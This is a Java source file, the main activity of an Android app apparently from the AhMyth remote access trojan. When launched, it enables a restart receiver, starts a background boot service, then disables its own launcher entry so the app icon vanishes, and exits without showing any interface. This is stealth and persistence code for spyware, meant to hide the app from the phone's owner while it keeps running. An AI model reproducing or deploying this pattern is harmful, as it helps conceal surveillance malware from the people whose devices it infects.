package ahmyth.mine.king.ahmyth;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.hardware.Camera;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.widget.Toast;



public class MainActivity extends Activity {



    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        //setContentView(R.layout.activity_main);

        ComponentName receiver = new ComponentName(this, restartReceiver.class);
        PackageManager pm = this.getPackageManager();

        pm.setComponentEnabledSetting(
                receiver,
                PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                PackageManager.DONT_KILL_APP
        );

        Intent i = new Intent(this, bootService.class);
        ComponentName service = this.startService(i);


        PackageManager p = getPackageManager();
        ComponentName componentName = new ComponentName(this, MainActivity.class);
        p.setComponentEnabledSetting(componentName,PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);

        //startService(new Intent(this, MainService.class));
        finish();
    }






}
